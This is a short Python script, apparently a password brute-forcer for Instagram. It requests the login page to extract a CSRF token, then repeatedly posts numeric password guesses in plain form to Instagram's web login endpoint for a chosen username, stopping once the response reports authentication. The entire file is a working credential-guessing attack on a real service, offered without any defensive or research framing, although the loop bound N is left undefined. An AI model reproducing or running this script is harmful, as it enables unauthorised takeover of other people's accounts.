import re
import requests
import json

from datetime import datetime

link = 'https://www.instagram.com/accounts/login/'
login_url = 'https://www.instagram.com/api/v1/web/accounts/login/ajax/'

password=0
for i in range(1,N):
    time = int(datetime.now().timestamp())
    payload = {
        'username': 'username',#--username
        'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{time}:{i}', #brutforce
        # <-- note the '0' - that means we want to use plain passwords
        'queryParams': {},
        'optIntoOneTap': 'false'
    }

    with requests.Session() as s:
        r = s.get(link)
        csrf = re.findall(r"csrf_token\":\"(.*?)\"", r.text)[0]
        r = s.post(login_url, data=payload, headers={
            "user-agent": "Mozilla/6.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36",
            "x-requested-with": "XMLHttpRequest",
            "referer": "https://www.instagram.com/accounts/login/",
            "x-csrftoken": csrf
        })
        print(r.status_code)

        #print(r.url)
        response_data = json.loads(r.text)
        if response_data.get("authenticated"):
            password=i
            break

print(password)



